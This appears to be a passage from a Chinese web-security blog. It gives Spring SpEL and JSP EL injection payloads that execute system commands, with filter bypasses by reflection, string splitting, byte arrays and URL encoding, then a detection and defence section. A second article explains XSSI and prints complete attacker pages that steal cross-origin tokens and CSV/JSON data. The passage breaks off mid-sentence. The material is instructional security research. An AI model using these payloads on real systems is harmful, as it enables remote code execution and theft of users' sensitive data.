运行弹计算器： PoC&amp;Bypass整理下面我们来整理下各种利用的PoC，这里默认把定界符#{}去掉。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051// PoC原型// RuntimeT(java.lang.Runtime).getRuntime().exec(&quot;calc&quot;)T(Runtime).getRuntime().exec(&quot;calc&quot;)// ProcessBuildernew java.lang.ProcessBuilder(&#123;&apos;calc&apos;&#125;).start()new ProcessBuilder(&#123;&apos;calc&apos;&#125;).start()******************************************************************************// Bypass技巧// 反射调用T(String).getClass().forName(&quot;java.lang.Runtime&quot;).getRuntime().exec(&quot;calc&quot;)// 同上，需要有上下文环境#this.getClass().forName(&quot;java.lang.Runtime&quot;).getRuntime().exec(&quot;calc&quot;)// 反射调用+字符串拼接，绕过如javacon题目中的正则过滤T(String).getClass().forName(&quot;java.l&quot;+&quot;ang.Ru&quot;+&quot;ntime&quot;).getMethod(&quot;ex&quot;+&quot;ec&quot;,T(String[])).invoke(T(String).getClass().forName(&quot;java.l&quot;+&quot;ang.Ru&quot;+&quot;ntime&quot;).getMethod(&quot;getRu&quot;+&quot;ntime&quot;).invoke(T(String).getClass().forName(&quot;java.l&quot;+&quot;ang.Ru&quot;+&quot;ntime&quot;)),new String[]&#123;&quot;cmd&quot;,&quot;/C&quot;,&quot;calc&quot;&#125;)// 同上，需要有上下文环境#this.getClass().forName(&quot;java.l&quot;+&quot;ang.Ru&quot;+&quot;ntime&quot;).getMethod(&quot;ex&quot;+&quot;ec&quot;,T(String[])).invoke(T(String).getClass().forName(&quot;java.l&quot;+&quot;ang.Ru&quot;+&quot;ntime&quot;).getMethod(&quot;getRu&quot;+&quot;ntime&quot;).invoke(T(String).getClass().forName(&quot;java.l&quot;+&quot;ang.Ru&quot;+&quot;ntime&quot;)),new String[]&#123;&quot;cmd&quot;,&quot;/C&quot;,&quot;calc&quot;&#125;)// 当执行的系统命令被过滤或者被URL编码掉时，可以通过String类动态生成字符，Part1// byte数组内容的生成后面有脚本new java.lang.ProcessBuilder(new java.lang.String(new byte[]&#123;99,97,108,99&#125;)).start()// 当执行的系统命令被过滤或者被URL编码掉时，可以通过String类动态生成字符，Part2// byte数组内容的生成后面有脚本T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(108)).concat(T(java.lang.Character).toString(99)))// JavaScript引擎通用PoCT(javax.script.ScriptEngineManager).newInstance().getEngineByName(&quot;nashorn&quot;).eval(&quot;s=[3];s[0]=&apos;cmd&apos;;s[1]=&apos;/C&apos;;s[2]=&apos;calc&apos;;java.la&quot;+&quot;ng.Run&quot;+&quot;time.getRu&quot;+&quot;ntime().ex&quot;+&quot;ec(s);&quot;)T(org.springframework.util.StreamUtils).copy(T(javax.script.ScriptEngineManager).newInstance().getEngineByName(&quot;JavaScript&quot;).eval(&quot;xxx&quot;),)// JavaScript引擎+反射调用T(org.springframework.util.StreamUtils).copy(T(javax.script.ScriptEngineManager).newInstance().getEngineByName(&quot;JavaScript&quot;).eval(T(String).getClass().forName(&quot;java.l&quot;+&quot;ang.Ru&quot;+&quot;ntime&quot;).getMethod(&quot;ex&quot;+&quot;ec&quot;,T(String[])).invoke(T(String).getClass().forName(&quot;java.l&quot;+&quot;ang.Ru&quot;+&quot;ntime&quot;).getMethod(&quot;getRu&quot;+&quot;ntime&quot;).invoke(T(String).getClass().forName(&quot;java.l&quot;+&quot;ang.Ru&quot;+&quot;ntime&quot;)),new String[]&#123;&quot;cmd&quot;,&quot;/C&quot;,&quot;calc&quot;&#125;)),)// JavaScript引擎+URL编码// 其中URL编码内容为：// 不加最后的getInputStream()也行，因为弹计算器不需要回显T(org.springframework.util.StreamUtils).copy(T(javax.script.ScriptEngineManager).newInstance().getEngineByName(&quot;JavaScript&quot;).eval(T(java.net.URLDecoder).decode(&quot;%6a%61%76%61%2e%6c%61%6e%67%2e%52%75%6e%74%69%6d%65%2e%67%65%74%52%75%6e%74%69%6d%65%28%29%2e%65%78%65%63%28%22%63%61%6c%63%22%29%2e%67%65%74%49%6e%70%75%74%53%74%72%65%61%6d%28%29&quot;)),)// 黑名单过滤&quot;.getClass(&quot;，可利用数组的方式绕过，还未测试成功&apos;&apos;[&apos;class&apos;].forName(&apos;java.lang.Runtime&apos;).getDeclaredMethods()[15].invoke(&apos;&apos;[&apos;class&apos;].forName(&apos;java.lang.Runtime&apos;).getDeclaredMethods()[7].invoke(null),&apos;calc&apos;)// JDK9新增的shell，还未测试T(SomeWhitelistedClassNotPartOfJDK).ClassLoader.loadClass(&quot;jdk.jshell.JShell&quot;,true).Methods[6].invoke(null,&#123;&#125;).eval(&apos;whatever java code in one statement&apos;).toString() CreateAscii.py，用于String类动态生成字符的字符ASCII码转换生成： 1234567891011121314message = input('Enter message to encode:') print('Decoded string (in ASCII):\\n') print('T(java.lang.Character).toString(%s)' % ord(message[0]), end=\"\")for ch in message[1:]: print('.concat(T(java.lang.Character).toString(%s))' % ord(ch), end=\"\"), print('\\n') print('new java.lang.String(new byte[]&#123;', end=\"\"),print(ord(message[0]), end=\"\")for ch in message[1:]: print(',%s' % ord(ch), end=\"\"), print(')&#125;') 其他的一些payload： 12345678910111213141516// 转自：https://www.jianshu.com/p/ce4ac733a4b9$&#123;pageContext&#125; 对应于JSP页面中的pageContext对象（注意：取的是pageContext对象。）$&#123;pageContext.getSession().getServletContext().getClassLoader().getResource(&quot;&quot;)&#125; 获取web路径$&#123;header&#125; 文件头参数$&#123;applicationScope&#125; 获取webRoot$&#123;pageContext.request.getSession().setAttribute(&quot;a&quot;,pageContext.request.getClass().forName(&quot;java.lang.Runtime&quot;).getMethod(&quot;getRuntime&quot;,null).invoke(null,null).exec(&quot;命令&quot;).getInputStream())&#125; 执行命令// 渗透思路：获取webroot路径，exec执行命令echo写入一句话。&lt;p th:text=&quot;$&#123;#this.getClass().forName(&apos;java.lang.System&apos;).getProperty(&apos;user.dir&apos;)&#125;&quot;&gt;&lt;/p&gt; //获取web路径 0x03 检测与防御检测方法全局搜索关键特征： 12345678910//关键类org.springframework.expression.Expressionorg.springframework.expression.ExpressionParserorg.springframework.expression.spel.standard.SpelExpressionParser//调用特征ExpressionParser parser = new SpelExpressionParser();Expression expression = parser.parseExpression(str);expression.getValue()expression.setValue() 防御方法最直接的修复方法是使用SimpleEvaluationContext替换StandardEvaluationContext。 官方文档：https://docs.spring.io/spring/docs/5.0.6.RELEASE/javadoc-api/org/springframework/expression/spel/support/SimpleEvaluationContext.html Demo： 123456String spel = \"T(java.lang.Runtime).getRuntime().exec(\\\"calc\\\")\";ExpressionParser parser = new SpelExpressionParser();Student student = new Student();EvaluationContext context = SimpleEvaluationContext.forReadOnlyDataBinding().withRootObject(student).build();Expression expression = parser.parseExpression(spel);System.out.println(expression.getValue(context)); 0x04 参考由浅入深SpEL表达式注入漏洞 SpEL表达式","tags":[{"name":"Web安全","slug":"Web安全","permalink":"https://www.mi1k7ea.com/tags/Web安全/"},{"name":"Java","slug":"Java","permalink":"https://www.mi1k7ea.com/tags/Java/"},{"name":"SpEL注入","slug":"SpEL注入","permalink":"https://www.mi1k7ea.com/tags/SpEL注入/"}]},{"title":"浅析XSSI漏洞","date":"2020-01-04T02:24:56.000Z","path":"2020/01/04/浅析XSSI漏洞/","text":"0x00 背景XSSI漏洞是个老东西了，最近看了下有点新东西，就记下笔记。 为了有效防御XSS，业界推出了CSP即内容安全策略，即使用白名单机制，对网站加载或执行的资源进行安全策略的控制。这种情形下，除非CSP配置存在问题，不然XSS一般是难以再被深入挖掘利用了。 但在某些场景中，开发者看你们会将敏感信息存放在某些文件中，当无法对XSS进行利用时，此时就可以尝试挖掘下是否存在XSSI漏洞。 0x01 XSSI原理XSSI（全称Cross Site Script Inclusion）跨站脚本包含，是一种通过嵌入script标签的src属性来加载外部数据来实现绕过边界窃取敏感信息的漏洞。 例如： 12&lt;!-- attacker's page loads external data with SCRIPT tag --&gt;&lt;SCRIPT src=\"http://target.wooyun.org/secret\"&gt;&lt;/SCRIPT&gt; XSSI的核心原理就是绕过SOP（同源策略）来跨域包含含有敏感信息的外域文件。我们知道，script标签是允许跨域加载资源的，如果某个网站的动态脚本、文件或响应中包含某些敏感信息（比如唯一标识符、个人资料、防御CSRF的Token），便有信息泄露的风险。XSSI就是利用的script标签允许跨域加载资源的特性来实现跨域包含资源的，这正是通过JSONP的技术来实现的。注意，大多数的XSSI都是针对动态JS文件进行攻击利用的。 传统的XSSI攻击场景如下：恶意页面B使用script标签包含了目标网站A用来储存敏感数据的信息源C（可能是动态脚本、文件或响应），当攻击者引导受害者访问B时，由于受害者此时在A处于登录态，B可以轻松获取C中包含的受害者的敏感信息。 如图： 0x02 XSSI与XSS、CSRF的区别相同点：三者均为Web前端安全漏洞，即针对客户端攻击的漏洞。 不同点： XSS是在受害者页面中注入恶意代码执行恶意操作，例如窃取已登录用户的cookie信息； CSRF是通过诱使受害者访问恶意页面导致向目标页面发起请求，在受害者已登录的目标页面中执行恶意动作，例如提交修改用户密码的表单操作； XSSI是通过script标签的src属性来跨域包含含有敏感数据的文件来窃取敏感信息的； 0x03 XSSI攻击利用XSSI的攻击利用根据包含敏感信息的目标文件类型主要分两种场景，即JS文件和其他文件。这里JS文件的攻击利用最为简单直接，因为JS文件其内容本身就是JS代码，加载到script标签中刚好符合JS格式语法；而其他类型的文件的利用相比之下较为复杂。 我们可以对XSSI的攻击利用进行个简单的分类： 针对JavaScript类型文件 静态的JavaScript文件 静态的JavaScript文件，但仅在认证后可访问 动态的JavaScript文件 针对非JavaScript类型文件 CSV文件 JSON文件/响应 针对JavaScript类型文件在某些JS文件中，可能会保存着一些敏感信息。当然，静态和动态的JS文件它们之间的利用是存在区别的。 窃取JS全局变量的值这里假设目标服务端存在静态的secret.js文件，里面保存着token敏感信息： 1var token = \"mi1k7ea_token_192ufh189u2erjsjoif189u\"; 攻击者编写的xssi.html文件： 12345678910111213141516&lt;!--恶意页面--&gt;&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;title&gt;XSSI Attack&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;h2&gt;XSSI Attack&lt;/h2&gt;&lt;p id=\"leaked_content\"&gt;&lt;/p&gt;&lt;script type=\"text/javascript\" src=\"http://192.168.10.130:81/secret.js\"&gt;&lt;/script&gt;&lt;script type=\"text/javascript\" src=\"jquery-3.3.1\"&gt;&lt;/script&gt;&lt;script type=\"text/javascript\"&gt; $('#leaked_content').text(token);&lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 改文件即XSSI的攻击实现。通过script标签的src属性来跨域加载目标服务端的secret.js文件进来，然后将窃取到的token信息显示在页面上： 当然，这只是个模拟的简单的不行的演示。因为这个JS文件时静态的，直接访问都是可以的，此时利用XSSI进行攻击都是多此一举的。一般的，XSSI是针对动态的JS文件来攻击利用的，这是因为动态的JS文件通常在用户处于登录态时容易包含敏感信息。 那么如何快速分辨一个JS文件是否为动态JS文件？——当有Cookie和无Cookie时请求所响应的文件内容不同时，即可确定这是一个动态JS文件了，当然并不是每一个动态JS文件都可以被利用。 我们可以使用Burpsuite的插件DetectDynamicJS来完成这项工作，此插件已在github上开源，链接地址：https://github.com/portswigger/detect-dynamic-js 前面的敏感信息是保存在JS文件的全局变量中，获取的时候直接读取该全局变量的值即可，十分方便。下面看下敏感信息保存在JS文件的局部变量中如何来获取。 重写函数窃取数据一般情况下，网站都会将一些基本的功能函数写入一个JS文件中，以便后面的各项业务中能够很方便地重用这个功能函数。 Demo1这里假设目标服务端含有敏感token信息的动态JS文件，getToken()函数中的session是动态获取的，此时敏感信息保存在局部变量中，并且调用doSomeThing()函数对该敏感信息进行处理： 123456789101112131415(function()&#123; var token = getToken(); doSomeThing(token);&#125;)();function getToken()&#123; len = 16 || 32; var $chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz012345678'; var maxPos = $chars.length; var pwd = ''; for (i = 0; i &lt; len; i++) &#123; pwd += $chars.charAt(Math.floor(Math.random() * maxPos)); &#125; return pwd;&#125; XSSI利用页面，此时没法像前面那样直接通过全局变量就获取到敏感数据，因为这里敏感数据是保存在局部变量中的，并且调用了doSomeThing()方法对该变量进行处理，因此这里通过重写doSomeThing()函数来窃取token数据： 12345678910111213141516171819202122&lt;!--恶意页面--&gt;&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;title&gt;XSSI Attack&lt;/title&gt; &lt;script type=\"text/javascript\"&gt; window.data = ''; function doSomeThing(d)&#123; window.data = d; &#125; &lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;h2&gt;XSSI Attack&lt;/h2&gt;&lt;p id=\"leaked_content\"&gt;&lt;/p&gt;&lt;script type=\"text/javascript\" src=\"http://192.168.10.130:81/secret.js\"&gt;&lt;/script&gt;&lt;script type=\"text/javascript\" src=\"jquery-3.3.1\"&gt;&lt;/script&gt;&lt;script type=\"text/javascript\"&gt; $('#leaked_content').text(window.data);&lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 此时就能成功窃取到敏感信息token了，这是因为将目标服务端的JS文件加载进来后，在调用doSomeThing()函数处理敏感数据时，是直接调用的恶意页面上实现的doSomeThing()函数，从而执行了攻击者自己编写的doSomeThing()函数的代码被窃取到了数据： Demo2secret.js，这次传递给函数的数据是一个包含了我们想要的数据的回调函数： 123456(function()&#123; function callback()&#123; var email = \"123@123.com\"; &#125; doSomeThing(callback);&#125;)(); xssi.html，攻击者可以通过使用toString方法来获得回调函数中的这些数据： 12345678910111213141516171819202122&lt;!--恶意页面--&gt;&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;title&gt;XSSI Attack&lt;/title&gt; &lt;script type=\"text/javascript\"&gt; window.data = ''; function doSomeThing(callback)&#123; window.data = callback.toString(); &#125; &lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;h2&gt;XSSI Attack&lt;/h2&gt;&lt;p id=\"leaked_content\"&gt;&lt;/p&gt;&lt;script type=\"text/javascript\" src=\"http://192.168.10.131:81/secret.js\"&gt;&lt;/script&gt;&lt;script type=\"text/javascript\" src=\"jquery-3.3.1\"&gt;&lt;/script&gt;&lt;script type=\"text/javascript\"&gt; $('#leaked_content').text(window.data);&lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 这里就能获取到包括敏感信息在内的整个回调函数的内容： 如果想精准输出内容，可用正则： 123456789... &lt;script type=\"text/javascript\"&gt; window.data = ''; function doSomeThing(callback)&#123; var content = callback.toString(); window.data = /var.*\"(.*)\"/g.exec(content)[1]; &#125; &lt;/script&gt;... 重写原型链窃取数据如果目标JS文件中并未调用相应的函数对敏感数据进行处理，换句话说，就是我们没办法重写函数来窃取敏感数据，此时我们可以考虑通过重写原型链来实现。这种方式的关键点在于，JS中调用了敏感数据所属类型的内置方法，比如String类型的内置方法split()/trim()/search()…等。 Demo1这里假设目标服务端含有敏感token信息的动态JS文件，getToken()函数中的session是动态获取的，此时敏感信息保存在局部变量中，和前一小节的区别在于，并未调用函数对敏感数据进行处理，而是调用了String类型的内置方法trim()来处理该敏感数据： 123456789101112131415161718(function()&#123; function setInfo()&#123; var token = getToken(); var t = token.trim(); &#125; setInfo();&#125;)();function getToken()&#123; len = 16 || 32; var $chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz012345678'; var maxPos = $chars.length; var pwd = ''; for (i = 0; i &lt; len; i++) &#123; pwd += $chars.charAt(Math.floor(Math.random() * maxPos)); &#125; return pwd;&#125; XSSI利用页面，重写String类型的内置方法trim()的原型链来实现窃取敏感数据，这是由于token是String类型的，在调用trim()方法时会调用String原型链中的trim()方法： 1234567891011121314151617181920212223&lt;!--恶意页面--&gt;&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;title&gt;XSSI Attack&lt;/title&gt; &lt;script type=\"text/javascript\"&gt; window.data = ''; String.prototype.trim = function(param) &#123; window.data = this.toString(); return [null, this]; &#125; &lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;h2&gt;XSSI Attack&lt;/h2&gt;&lt;p id=\"leaked_content\"&gt;&lt;/p&gt;&lt;script type=\"text/javascript\" src=\"http://192.168.10.130:81/secret.js\"&gt;&lt;/script&gt;&lt;script type=\"text/javascript\" src=\"jquery-3.3.1\"&gt;&lt;/script&gt;&lt;script type=\"text/javascript\"&gt; $('#leaked_content').text(window.data);&lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 此时能够成功窃取到数据： 原型链分析我们到浏览器的Console试下就知道。先看下String类型的原型链确实存在trim()这个内置函数，当然，如果含有敏感信息的String类型的局部变量调用了其他如下列出的内置方法我们都可以直接同理利用： 接着看下trim()内置方法的实现： OK，现在我们知道目标JS中该String类型变量会调用trim()方法，那么我们就可以通过在我们的恶意页面来污染String原型链的trim()方法为我们自定义实现的方法，从而来窃取数据： Demo2较Demo1，使用了一个函数和toString方法。 secret.js： 123456(function()&#123; var func = function() &#123; var emails = [\"123@123.com\", \"456@456.com\"]; &#125; func.call();&#125;)(); xssi.html，通过prototype将所有Functiorn的call方法重写，然后再调用.toString()方法将函数转换为字符串类型再读取内容，最后再引入产生数据泄露的脚本文件执行： 123456789101112131415161718&lt;!--恶意页面--&gt;&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;title&gt;XSSI Attack&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;h2&gt;XSSI Attack&lt;/h2&gt;&lt;script&gt; Function.prototype.call = function() &#123; var funcString = this.toString(); var emails = /var emails = \\[(.*)\\]/g.exec(funcString)[1]; alert(emails); &#125;;&lt;/script&gt;&lt;script src=\"http://192.168.10.131:81/secret.js\"&gt;&lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 这里就不通过Jquery往标签中写内容了，因为这里污染了Function的原型链会让Jquery在执行时报错。修改成弹框显示就好： 针对非JavaScript类型文件某些场景下，目标文件并未JS类型，包含敏感信息的文件，其中的内容并不能直接作为一个JS变量的值读取，或者文件内容是多行的，这些都会使得XSSI的信息窃取变得很困难。 下面先看下之前wooyun的文章中说到的方法，但都有些历史了，这里本地测试下看看是否还能成功。其中涉及到的文件类型包括CSV、JSON等。 IE bug导致错误信息泄漏这种方法的局限性在于ie的版本要小于10，且目前的Chrome和Firefox都不能成功利用。除此之外，获取的CSV中的内容只能获取第一行、第二列的内容，并不能全部获取得到。 为了防止js错误信息跨域泄漏，对于外部加载的js文件，现在主流的浏览器只有固定的错误信息，比如“script error”，但是在ie9与ie10，情况不一定如此。 一般来说，在外部js发生语法错误的情况下，浏览器只会提供固定的错误信息，但是当在runtime发生错误的情况下，浏览器会提供详细的错误信息。比如”foo 未定义”之类的，某些浏览器一旦允许外域js回复详细的错误信息，就会导致信息泄漏。 就是说，当某个网页的内容能被js识别为javascript格式的话，那么就可能通过错误信息获取到目标的内容。 假设目标服务端存在包含敏感信息的a.csv： 12name,age,addressmi1k7ea,6,china 用软件打开就是这样的： xssi.html，设置window.error的错误显示： 1234567891011121314&lt;!--恶意页面--&gt;&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;title&gt;XSSI Attack&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;h2&gt;XSSI Attack&lt;/h2&gt;&lt;!-- set an error handler --&gt;&lt;script type=\"text/javascript\"&gt;window.onerror = function(err) &#123;alert(err)&#125;&lt;/script&gt;&lt;!-- load target CSV --&gt;&lt;script src=\"http://192.168.10.130:81/a.csv\"&gt;&lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 在ie 8上攻击利用，可以看到会显示CSV文件的第一行、第二列的内容： 出现这种情况的原因在于，浏览器将目标CSV文件内容识别为JavaScript，其中age被识别为某个未定义的JS变量。当为这种情况的时候，浏览器就允许页面捕捉来自不同网页的错误信息。 在Chrome和Firefox，以及10版本以上的ie都不能成功。比如Firefox中并不会弹框，而是直接被浏览器拦截了获取CSV类型的响应： UTF-16编码窃取敏感信息这种方法突破了前面只能对CSV信息进行窃取的尴尬局面，但局限性和前面的方法一样，仅在ie &lt; 10的版本下才能成功利用，因为ie 10会拒绝将没有空字节活着bom的编码为UTF-16。 这种方法的原理如下： 使用script标签的charset属性将包含的文件编码为UTF-16，其目的在于强制文件的所有内容连为一体，变为一个未定义的Javascript变量。然后通过在window域内使用onerror捕获错误信息（此错误信息一定为已编码的文件内容 is not defined），再进行解码即可。此举其实是为了防止符号会引起Javascript出现其他异常，例如英文逗号会截断文件内容，报错只会显示逗号前的内容未定义；而中文逗号则会直接提示非法字符，从而获取不到任何敏感信息。 a.json，假设的目标服务端保存着敏感数据的Json文件： 1&#123;\"username\":\"admin\", \"token\":\"89uki4gk9iu9213trju\"&#125; xssi.html，在script标签中加入charset=”UTF-16BE”，同时通过window.error来捕获错误信息并弹框显示出来： 1234567891011121314&lt;!--恶意页面--&gt;&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;title&gt;XSSI Attack&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;h2&gt;XSSI Attack&lt;/h2&gt;&lt;!-- set an error handler --&gt;&lt;script type=\"text/javascript\"&gt;window.onerror = function(err) &#123;alert(err)&#125;&lt;/script&gt;&lt;!-- load target JSON --&gt;&lt;script src=\"http://192.168.10.130:81/a.json\" charset=\"UTF-16BE\"&gt;&lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 本地使用ie 8进行测试，弹框显示一段乱码内容，并识别该乱码为JS变量未定义： 乱码内容如下： 1笢畳敲湡浥∺≡摭楮∬•瑯步渢㨢㠹畫椴杫㥩甹㈱㍴牪產 将这堆乱码再进行UTF-16BE编码等操作即可获取到原始内容·： 注意，这种方式成功的前提在于浏览器是否会将编码后的内容识别为JS的变量，若不能则无法利用成功。除了IE 10以上的版本，在当前的Chrome和Firefox中都是不能成功的，这是因为浏览器并未将编码后的内容识别为JS变量，自然而然地也就无法从window.error中捕获到乱码信息了： 下图是引自wooyun文章，能够被浏览器认定为有效的JS变量，当字符编码为UTF-16的时候的数字字母组合，ie 9将其99.3%认为是有效的js标示符，高于Chrome和Firefox： Harmony proxy bug in Firefox / Chrome Harmony是一个ECMAScript 6中的新功能，类似于Java的反射类，其中定义了对于对象属性的查找、分配、函数调用，在我们针对这些新特性的研究过程中发现该功能可以用于XSSI的攻击中。 注意，这种方法在当前较新版本的Chrome和Firefox中都以失效。 和前面一样的a.csv： 12name,age,addressmi1k7ea,6,china xssi.html，其中window.__proto__定义了一个代理对象，当访问一个未定义的全局变量，就会出发handler进行处理： 1234567891011121314151617181920&lt;!--恶意页面--&gt;&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;title&gt;XSSI Attack&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;h2&gt;XSSI Attack&lt;/h2&gt;&lt;!-- set proxy handler to window.__proto__ --&gt;&lt;script&gt; var handler = &#123; has: function(target, name) &#123;alert(\"data=\" + name); return true&#125;, get: function(target, name) &#123;return 1&#125; &#125;; window.__proto__ = new Proxy(&#123;&#125;, handler);&lt;/script&gt;&lt;!-- load target CSV --&gt;&lt;script src=\"http://192.168.10.130:81/a.csv\"&gt;&lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 在本地测试没成功，显示不能给该对象设置prototype： 穷举搜索穷举搜索简单地说就是在客户端使用某些方法来暴力破解目标文件中的敏感数据，分为下面三种类型。 定义变量穷举CSV内容此方法适用于当前所有IE版本。 在前面IE Bug小节中说到了利用IE的Bug可以获取CSV中的第一行第二列的内容，这是因为IE浏览器将该内容当成JS变量然后报错显示错误信息导致信息泄露。现在这种方法的原理在于，我们在恶意页面中就穷举定义CSV中可能存在的项的内容，如果穷举成功、定义了该CSV项的值的变量，那么浏览器就不会报错，证明我们穷举成功。 在前面的基础上，我们可以通过定义变量的方式来穷举CSV中的所有内容（这里数值无法定义变量也就无法穷举出其值），同时也解决了一般情况下浏览器不提供详细的外部错误信息的问题，这样，即使在最新版的IE 11也能够成功进行利用。 假设a.csv如下： 12name,age,addressmi1k7ea,6,china xssi.html，先啥变量都不定义： 123456789101112131415&lt;!--恶意页面--&gt;&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;title&gt;XSSI Attack&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;h2&gt;XSSI Attack&lt;/h2&gt;&lt;script type=\"text/javascript\"&gt; &lt;/script&gt;&lt;!-- load target CSV --&gt;&lt;script src=\"http://192.168.10.131:81/a.csv\"&gt;&lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 此时会报age未定义，也就是CSV中的第一行第二列的内容，和前面的一样： 接着，修改xssi.html，添加age变量的定义： 12345...&lt;script type=\"text/javascript\"&gt; var age = '';&lt;/script&gt;... 此时发现和前面的报错是一样的。没关系，我们直接修改xssi.html，添加age前面的name的变量的定义，发现报错信息就会往后识别了： 123456...&lt;script type=\"text/javascript\"&gt; var name = ''; var age = '';&lt;/script&gt;... 根据这个原理，我们就可以对CSV文件中的每一项的内容进行穷举，直至浏览器无报错时即穷举完成： 123456789...&lt;script type=\"text/javascript\"&gt; var name = ''; var age = ''; var address = ''; var mi1k7ea = ''; var china = '';&lt;/script&gt;... 值得注意的是，CSV中的项若为数值，则无需我们定义该数值的变量、也无法定义该变量，换句话说，这种方式除了CSV中的数值项、其他的全部内容都能够被成功穷举出来。 JS getter穷举CSV内容原理和上一小节定义变量大同小异，只是借助了JavaScript的getter方法来实现。 此方法同样适用于当前所有IE版本。 a.csv如上。 xssi.html，穷举过程和前面的类似，这里先对CVS中的几项进行定义穷举： 1234567891011121314151617&lt;!--恶意页面--&gt;&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;title&gt;XSSI Attack&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;h2&gt;XSSI Attack&lt;/h2&gt;&lt;script type=\"text/javascript\"&gt; Object.defineProperty(window, \"name\", &#123;get: function() &#123;alert(\"value=name\")&#125;&#125;); Object.defineProperty(window, \"age\", &#123;get: function() &#123;alert(\"value=age\")&#125;&#125;); Object.defineProperty(window, \"address\", &#123;get: function() &#123;alert(\"value=address\")&#125;&#125;);&lt;/script&gt;&lt;!-- load target CSV --&gt;&lt;script src=\"http://192.168.10.131:81/a.csv\"&gt;&lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 要是文件中每一项的内容被定义成功，则会逐个弹框显示出来，并且浏览器最后会报错有些像还未定义，当然显不显示具体的未定义的项的内容得看浏览器： 接着和前面小节一样，继续通过JS的getter来穷举出CSV文件内容中的其他项即可： 123456789...&lt;script type=\"text/javascript\"&gt; Object.defineProperty(window, \"name\", &#123;get: function() &#123;alert(\"value=name\")&#125;&#125;); Object.defineProperty(window, \"age\", &#123;get: function() &#123;alert(\"value=age\")&#125;&#125;); Object.defineProperty(window, \"address\", &#123;get: function() &#123;alert(\"value=address\")&#125;&#125;); Object.defineProperty(window, \"mi1k7ea\", &#123;get: function() &#123;alert(\"value=mi1k7ea\")&#125;&#125;); Object.defineProperty(window, \"china\", &#123;get: function() &#123;alert(\"value=china\")&#125;&#125;);&lt;/script&gt;... 此时穷举完成，浏览器也没有报错，说明CSV文件中的每一项均已被定义穷举（当然，数值项是无法通过定义穷举到的，这个缺点和前面小节是一样的）： 结合VBScript穷举JSON数组注意：VBScript只适用于IE中。此方法在我本地的IE 11中测试并不成功，而在IE 8上OK。 假设服务端存在包含敏感信息的文件a.json： 1[\"admin\",\"this_is_password\"] xssi.html，这里script标签添加language属性值为vbscript，其中模拟穷举JSON数组内容进行暴力破解： 123456789101112131415161718&lt;!--恶意页面--&gt;&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;title&gt;XSSI Attack&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;h2&gt;XSSI Attack&lt;/h2&gt;&lt;script language=\"vbscript\"&gt; Sub [\"admin\",\"password\"]: MsgBox \"value=password\": End Sub Sub [\"admin\",\"123456\"]: MsgBox \"value=123456\": End Sub Sub [\"admin\",\"admin\"]: MsgBox \"value=admin\": End Sub Sub [\"admin\",\"this_is_password\"]: MsgBox \"value=this_is_password\": End Sub&lt;/script&gt;&lt;!-- load target JSON as VBScript --&gt;&lt;script src=\"http://192.168.10.131:81/a.json\" language=\"vbscript\"&gt;&lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 在IE 8中成功利用VBScript穷举出JSON数组中的敏感信息： 利用敏感文件中的可控字段窃取数据CSV with quotations thef简单地说，就是CSV文件中的敏感内容被双引号括起来了，这样的话前面针对CSV的操作就没用了。但是如果我们能够控制CSV文件中某些项的值，那么还是可以进行信息窃取的，而且一般我们进行CSV文件导出之前、我们是可以设置我们想导出的项以及内容的。 注意，该方法目前仅适用于全版本的IE，不适用于Chrome和Firefox。 假设CSV文件如下，其中有两处地方可控： 123451,&quot;可控&quot;,&quot;123@123.com&quot;,&quot;03-0000-0001&quot;2,&quot;admin&quot;,&quot;456@456.com&quot;,&quot;03-0000-0002&quot;3,&quot;guest&quot;,&quot;789@789.com&quot;,&quot;03-0000-0003&quot;4,&quot;tester&quot;,&quot;abc@abc.com&quot;,&quot;03-0000-0004&quot;5,&quot;可控&quot;,&quot;def@def.com&quot;,&quot;03-0000-0005&quot; 此时，我们可以通过可控的项来构造如下的CSV文件，先注入个双引号闭合掉前面的引号，然后使用mi1k7ea=function() {/*…*/}来解决多行的问题： 